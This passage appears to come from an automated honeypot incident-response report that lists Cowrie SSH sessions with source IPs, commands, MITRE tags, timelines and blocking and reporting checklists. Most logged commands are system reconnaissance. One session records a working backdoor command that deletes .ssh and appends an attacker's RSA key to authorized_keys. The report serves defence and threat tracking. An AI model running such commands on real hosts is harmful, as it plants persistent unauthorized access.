| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:53:26` | `cowrie.session.connect` |
| `2026-07-09 19:53:27` | `cowrie.client.version` |
| `2026-07-09 19:53:27` | `cowrie.client.kex` |
| `2026-07-09 19:53:29` | `cowrie.login.success` |
| `2026-07-09 19:53:30` | `cowrie.direct-tcpip.request` |
| `2026-07-09 19:53:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.199.172[.]66` to AbuseIPDB if not already reported
- [ ] Block `221.199.172[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7b7a886adf1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:54 |
| **Last Seen** | 2026-07-09 19:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:54:03` | `cowrie.session.connect` |
| `2026-07-09 19:54:03` | `cowrie.client.version` |
| `2026-07-09 19:54:03` | `cowrie.client.kex` |
| `2026-07-09 19:54:04` | `cowrie.login.success` |
| `2026-07-09 19:54:06` | `cowrie.session.params` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.success` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.command.input` |
| `2026-07-09 19:54:06` | `cowrie.log.closed` |
| `2026-07-09 19:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaedbc9b9756

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:55 |
| **Last Seen** | 2026-07-09 19:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:55:21` | `cowrie.session.connect` |
| `2026-07-09 19:55:21` | `cowrie.client.version` |
| `2026-07-09 19:55:21` | `cowrie.client.kex` |
| `2026-07-09 19:55:22` | `cowrie.login.success` |
| `2026-07-09 19:55:24` | `cowrie.session.params` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.success` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.command.input` |
| `2026-07-09 19:55:24` | `cowrie.log.closed` |
| `2026-07-09 19:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f727245bf37c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:56 |
| **Last Seen** | 2026-07-09 19:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:56:39` | `cowrie.session.connect` |
| `2026-07-09 19:56:39` | `cowrie.client.version` |
| `2026-07-09 19:56:39` | `cowrie.client.kex` |
| `2026-07-09 19:56:41` | `cowrie.login.success` |
| `2026-07-09 19:56:43` | `cowrie.session.params` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.success` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:43` | `cowrie.log.closed` |
| `2026-07-09 19:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-519fd14fd83d

| Field | Detail |
|---|---|
| **Source IP** | `180.74.91[.]50` |
| **First Seen** | 2026-07-09 19:56 |
| **Last Seen** | 2026-07-09 19:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:56:40` | `cowrie.session.connect` |
| `2026-07-09 19:56:40` | `cowrie.client.version` |
| `2026-07-09 19:56:40` | `cowrie.client.kex` |
| `2026-07-09 19:56:41` | `cowrie.login.success` |
| `2026-07-09 19:56:42` | `cowrie.session.params` |
| `2026-07-09 19:56:42` | `cowrie.command.input` |
| `2026-07-09 19:56:42` | `cowrie.command.failed` |
| `2026-07-09 19:56:43` | `cowrie.log.closed` |
| `2026-07-09 19:56:43` | `cowrie.session.params` |
| `2026-07-09 19:56:43` | `cowrie.command.input` |
| `2026-07-09 19:56:44` | `cowrie.session.file_download` |
| `2026-07-09 19:56:44` | `cowrie.log.closed` |
| `2026-07-09 19:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.74.91[.]50` to AbuseIPDB if not already reported
- [ ] Block `180.74.91[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb71eb19fb6

| Field | Detail |
|---|---|
| **Source IP** | `180.74.91[.]50` |
| **First Seen** | 2026-07-09 19:56 |
| **Last Seen** | 2026-07-09 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:56:44` | `cowrie.session.connect` |
| `2026-07-09 19:56:44` | `cowrie.client.version` |
| `2026-07-09 19:56:44` | `cowrie.client.kex` |
| `2026-07-09 19:56:45` | `cowrie.login.success` |
| `2026-07-09 19:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.74.91[.]50` to AbuseIPDB if not already reported
- [ ] Block `180.74.91[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e10ae62b3c1

| Field | Detail |
|---|---|
| **Source IP** | `180.74.91[.]50` |
| **First Seen** | 2026-07-09 19:56 |
| **Last Seen** | 2026-07-09 19:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:56:46` | `cowrie.session.connect` |
| `2026-07-09 19:56:46` | `cowrie.client.version` |
| `2026-07-09 19:56:46` | `cowrie.client.kex` |
| `2026-07-09 19:56:47` | `cowrie.login.success` |
| `2026-07-09 19:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.74.91[.]50` to AbuseIPDB if not already reported
- [ ] Block `180.74.91[.]50` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c083c46e55b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:57 |
| **Last Seen** | 2026-07-09 19:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:57:55` | `cowrie.session.connect` |
| `2026-07-09 19:57:55` | `cowrie.client.version` |
| `2026-07-09 19:57:55` | `cowrie.client.kex` |
| `2026-07-09 19:57:56` | `cowrie.login.success` |
| `2026-07-09 19:57:57` | `cowrie.session.params` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.success` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:57` | `cowrie.command.input` |
| `2026-07-09 19:57:58` | `cowrie.log.closed` |
| `2026-07-09 19:57:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e72fecf56ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 19:59 |
| **Last Seen** | 2026-07-09 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 19:59:12` | `cowrie.session.connect` |
| `2026-07-09 19:59:13` | `cowrie.client.version` |
| `2026-07-09 19:59:13` | `cowrie.client.kex` |
| `2026-07-09 19:59:14` | `cowrie.login.success` |
| `2026-07-09 19:59:15` | `cowrie.session.params` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.success` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.command.input` |
| `2026-07-09 19:59:15` | `cowrie.log.closed` |
| `2026-07-09 19:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617a025c9cba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:00 |
| **Last Seen** | 2026-07-09 20:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:00:30` | `cowrie.session.connect` |
| `2026-07-09 20:00:30` | `cowrie.client.version` |
| `2026-07-09 20:00:30` | `cowrie.client.kex` |
| `2026-07-09 20:00:31` | `cowrie.login.success` |
| `2026-07-09 20:00:32` | `cowrie.session.params` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.success` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:32` | `cowrie.command.input` |
| `2026-07-09 20:00:33` | `cowrie.log.closed` |
| `2026-07-09 20:00:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b43b17d4547

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:01 |
| **Last Seen** | 2026-07-09 20:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:01:48` | `cowrie.session.connect` |
| `2026-07-09 20:01:49` | `cowrie.client.version` |
| `2026-07-09 20:01:49` | `cowrie.client.kex` |
| `2026-07-09 20:01:49` | `cowrie.login.success` |
| `2026-07-09 20:01:50` | `cowrie.session.params` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.success` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:50` | `cowrie.command.input` |
| `2026-07-09 20:01:57` | `cowrie.log.closed` |
| `2026-07-09 20:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9bf8645546b

| Field | Detail |
|---|---|
| **Source IP** | `185.220.101[.]107` |
| **First Seen** | 2026-07-09 20:03 |
| **Last Seen** | 2026-07-09 20:03 |
| **Session Duration** | 24s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:03:08` | `cowrie.session.connect` |
| `2026-07-09 20:03:08` | `cowrie.client.version` |
| `2026-07-09 20:03:09` | `cowrie.client.kex` |
| `2026-07-09 20:03:10` | `cowrie.client.fingerprint` |
| `2026-07-09 20:03:10` | `cowrie.login.failed` |
| `2026-07-09 20:03:10` | `cowrie.login.success` |
| `2026-07-09 20:03:32` | `cowrie.direct-tcpip.request` |
| `2026-07-09 20:03:32` | `cowrie.direct-tcpip.ja4` |
| `2026-07-09 20:03:32` | `cowrie.direct-tcpip.data` |
| `2026-07-09 20:03:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.220.101[.]107` to AbuseIPDB if not already reported
- [ ] Block `185.220.101[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbcc1bf47f9b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:03 |
| **Last Seen** | 2026-07-09 20:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:03:10` | `cowrie.session.connect` |
| `2026-07-09 20:03:10` | `cowrie.client.version` |
| `2026-07-09 20:03:10` | `cowrie.client.kex` |
| `2026-07-09 20:03:11` | `cowrie.login.success` |
| `2026-07-09 20:03:12` | `cowrie.session.params` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.success` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.command.input` |
| `2026-07-09 20:03:12` | `cowrie.log.closed` |
| `2026-07-09 20:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd2aa7008f9a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 20:03 |
| **Last Seen** | 2026-07-09 20:04 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:03:48` | `cowrie.session.connect` |
| `2026-07-09 20:03:50` | `cowrie.client.version` |
| `2026-07-09 20:03:50` | `cowrie.client.kex` |
| `2026-07-09 20:03:56` | `cowrie.login.success` |
| `2026-07-09 20:03:59` | `cowrie.session.params` |
| `2026-07-09 20:03:59` | `cowrie.command.input` |
| `2026-07-09 20:04:00` | `cowrie.log.closed` |
| `2026-07-09 20:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc24360cdfaf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:04 |
| **Last Seen** | 2026-07-09 20:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:04:31` | `cowrie.session.connect` |
| `2026-07-09 20:04:31` | `cowrie.client.version` |
| `2026-07-09 20:04:31` | `cowrie.client.kex` |
| `2026-07-09 20:04:32` | `cowrie.login.success` |
| `2026-07-09 20:04:33` | `cowrie.session.params` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.success` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:33` | `cowrie.command.input` |
| `2026-07-09 20:04:34` | `cowrie.log.closed` |
| `2026-07-09 20:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
